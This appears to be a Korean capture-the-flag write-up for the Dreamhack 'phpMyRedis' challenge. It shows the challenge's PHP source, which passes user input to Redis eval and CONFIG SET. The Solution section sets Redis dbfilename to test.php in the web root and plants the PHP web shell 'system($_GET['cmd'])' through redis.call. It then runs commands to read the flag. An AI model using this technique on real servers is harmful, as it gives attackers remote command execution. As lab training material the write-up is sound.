---
title : Dreamhack - phpMyRedis
date: 2022-04-08 22:11 +0900
categories: [Dreamhack, Webhacking]
tags: [redis, dreamhack, dreamhack phpmyredis, wargame]
---

## phpMyRedis
<hr style="border-top: 1px solid;"><br>

![index.php](https://user-images.githubusercontent.com/52172169/162443204-9116725d-d3b5-46c1-b8b4-8a9975a67608.png)

<br>

index.php

```php
<?php
    include_once "./core.php";
?>
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
            <div class="card-content">
                <div class="columns">
                    <div class="column is-10">
                        <h1 class="title">phpMyRedis</h1>
                    </div>
                    <div>
                        <div class="column is-2"><a href="/config.php" class="card-footer-item">Config</a></div>
                    </div>
                </div>
                <form method="post">
                    <div class="field">
                        <label class="label">Command</label>
                        <div class="control">
                            <textarea class="textarea" name="cmd"><?=isset($_POST['cmd'])?$_POST['cmd']:'return 1;'?></textarea>
                        </div>
                        <label class="checkbox">
                            <input type="checkbox" name="save">Save
                        </label>
                    </div>
                    <div class="control">
                        <input class="button is-success" type="submit" value="submit">
                    </div>
                </form>
                <?php 
                    if(isset($_POST['cmd'])){
                        $redis = new Redis();
                        $redis->connect($REDIS_HOST);
                        $ret = json_encode($redis->eval($_POST['cmd']));
                        echo '<h1 class="subtitle">Result</h1>';
                        echo "<pre>$ret</pre>";
                        if (!array_key_exists('history_cnt', $_SESSION)) {
                            $_SESSION['history_cnt'] = 0;
                        }
                        $_SESSION['history_'.$_SESSION['history_cnt']] = $_POST['cmd'];
                        $_SESSION['history_cnt'] += 1;

                        if(isset($_POST['save'])){
                            $path = './data/'. md5(session_id());
                            $data = '> ' . $_POST['cmd'] . PHP_EOL . str_repeat('-',50) . PHP_EOL . $ret;
                            file_put_contents($path, $data);
                            echo "saved at : <a target='_blank' href='$path'>$path</a>";
                        }
                    }
                ?>
            </div>
        </div>
        <br/>
        <div class="container card">
            <div class="card-content">
                <div class="columns">
                    <div class="column is-10">
                        <h1 class="title">Command History</h1>
                    </div>
                    <div class="column is-2"><a href="/reset.php" class="card-footer-item">Reset</a></div>
                </div>
                <div class="content">
                    <ul>
                    <?php
                        for($i=0; $i<$_SESSION['history_cnt']; $i++){
                            echo "<li>".$_SESSION['history_'.$i]."</li>";
                        }
                    ?>
                    </ul>
                </div>
            </div>
        </div>
    </body>
</html>
```

<br>

![config.php](https://user-images.githubusercontent.com/52172169/162443259-15a8f377-3b78-405d-beed-953027a2ad40.png)

<br>

config.php

```php
<?php
    include_once "./core.php";
?>
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
            <div class="card-content">
                <div class="columns">
                    <div class="column is-10">
                        <h1 class="title">phpMyRedis</h1>
                    </div>
                    <div>
                        <div class="column is-2"><a href="/" class="card-footer-item">Command</a></div>
                    </div>
                </div>
                <form method="post">
                    <label class="label">Config</label>
                    <div class="field">
                        <div class="control">
                            <div class="select">
                                <select name="option">
                                    <option>GET</option>
                                    <option>SET</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="field">
                        <label class="label">Key</label>
                        <div class="control">
                            <input class="input" type="text" name="key">
                        </div>
                    </div>
                    <div class="field">
                        <label class="label">Value</label>
                        <div class="control">
                            <input class="input" type="text" name="value">
                        </div>
                    </div>
                    <div class="control">
                        <input class="button is-success" type="submit" value="submit">
                    </div>
                </form>
                <?php 
                    if(isset($_POST['option'])){
                        $redis = new Redis();
                        $redis->connect($REDIS_HOST);
                        if($_POST['option'] == 'GET'){
                            $ret = json_encode($redis->config($_POST['option'], $_POST['key']));
                        }elseif($_POST['option'] == 'SET'){
                            $ret = $redis->config($_POST['option'], $_POST['key'], $_POST['value']);
                        }else{
                            die('error !');
                        }                        
                        echo '<h1 class="subtitle">Result</h1>';
                        echo "<pre>$ret</pre>";
                    }
                ?>
            </div>
        </div>
    </body>
</html>
```


<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

phpredis, eval, config
: <a href="https://github.com/phpredis/phpredis" target="_blank">github.com/phpredis/phpredis</a>
: <a href="https://github.com/phpredis/phpredis#eval" target="_blank">github.com/phpredis/phpredis#eval</a>
: <a href="https://github.com/phpredis/phpredis#config" target="_blank">github.com/phpredis/phpredis#config</a>

<br>

Scripting with Lua
: <a href="https://redis.io/docs/manual/programmability/eval-intro/" target="_blank">redis.io/docs/manual/programmability/eval-intro/</a>

Redis Lua API Ref
: <a href="https://redis.io/docs/manual/programmability/lua-api/#a-namerediscalla-rediscallcommand-arg" target="_blank">redis.io/docs/manual/programmability/lua-api/#a-namerediscalla-rediscallcommand-arg</a>

<br>

redis config get
: <a href="http://redisgate.kr/redis/server/config_get.php" target="_blank">redisgate.kr/redis/server/config_get.php</a>
: <a href="https://bstar36.tistory.com/349" target="_blank">bstar36.tistory.com/349</a>

<br>

강의를 보면 아래와 같은 설명이 있다.
: Redis는 메모리에 데이터를 저장하는 인 메모리(In-Memory) 데이터베이스입니다.
: 메모리는 휘발성이라는 특징을 갖고 있기 때문에 데이터 손실 방지를 위해 일정 시간마다 메모리 데이터를 파일 시스템에 저장합니다. 
: Redis는 명령어를 이용해 메모리 데이터를 저장하는 파일의 저장 주기를 지정하거나 즉시 저장할 수 있으며 저장되는 파일의 경로와 이름, 그리고 저장할 데이터를 함께 설정할 수 있습니다.

<br>

따라서 저장되는 파일의 이름을 내가 원하는 값으로 변경한 후 접근 가능한 디렉토리(```/var/www/html``` or ```/var/www/html/data```)에 있으면 되는 것이다.

<br>

```config get *```을 해주면 모든 설정값이 나오는데 그 중 dbfilename, dir, save 값을 확인하면 아래와 같다.

----> ```"dir":"\/var\/www\/html",  "dbfilename":"dump.rdb" , "save":"3600 1 300 100 60 10000"```

<br>

현재 설정 값을 ```config set dbfilename test.php```, ```config set save 10 1```로 변경하였다.

그 후 Command 페이지에서 ```return redis.call('set','test',"<?php system($_GET['cmd']); ?>");```을 입력해준 뒤 ```/test.php?cmd=ls```를 하면 ls 명령어가 실행된다.

<br>

플래그가 ```/flag```에 있으므로 출력했으나 아무것도 나오지 않았고, ```file /flag```를 하니 ```executable, regular file, no read permission```이라고 떴다.

권한을 보니 execute 권한만 있었다. 따라서 ```cd /; ./flag```를 하니 플래그가 나왔다.

<br><br>
<hr style="border: 2px solid;">
<br><br>
